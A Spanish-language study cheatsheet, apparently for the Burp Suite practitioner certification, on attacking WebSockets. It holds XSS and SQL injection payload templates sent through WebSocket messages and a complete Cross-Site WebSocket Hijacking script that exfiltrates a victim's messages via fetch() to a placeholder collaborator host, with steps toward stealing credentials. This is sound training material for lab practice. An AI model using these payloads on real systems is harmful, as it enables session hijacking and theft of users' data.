---
tipo: cheatsheet
vuln: websockets
tags: [bscp, tipo/cheatsheet, vuln/websockets]
relacionada: "[[WebSockets]]"
---

# CS · WebSockets

## Flujo repetible
1. Intercepta el handshake y los mensajes WebSocket con Burp.
2. Manipula mensajes: prueba XSS/SQLi/inyección sobre el contenido.
3. Si el handshake no valida Origin, monta Cross-Site WebSocket Hijacking (CSWSH) desde {{EXPLOIT}}.

## Detección
```
Handshake: GET ... Upgrade: websocket   (ws:// o wss:// hacia {{BASE}})
¿Valida el header Origin? ¿La sesión va sólo por cookie? -> candidato a CSWSH.
```

## Plantillas de payload
```
# Manipulación de mensaje (inyección en el contenido)
{"message":"<img src=x onerror=alert(1)>"}     (XSS reflejado vía WS)
{"user":"{{PARAM}}' OR 1=1--"}                  (SQLi tunelizada por WS)
```
```html
<!-- CSWSH: robar datos de la sesión de {{VICTIM}} y exfiltrar a {{COLLAB}} -->
<script>
var ws=new WebSocket('wss://{{BASE}}/chat');
ws.onopen=function(){ws.send('READY');};
ws.onmessage=function(e){fetch('https://{{COLLAB}}/?d='+encodeURIComponent(e.data));};
</script>
```

## Escalada al objetivo
CSWSH sobre la sesión de {{VICTIM}} → leer su historial/credenciales → acceso admin.

## Checklist
- [ ] Intercepté y manipulé mensajes WS
- [ ] Probé XSS/SQLi sobre el contenido
- [ ] Probé CSWSH si el handshake no valida Origin
- [ ] Confirmé exfiltración a {{COLLAB}}

## Referencias
- https://portswigger.net/web-security/websockets
- https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
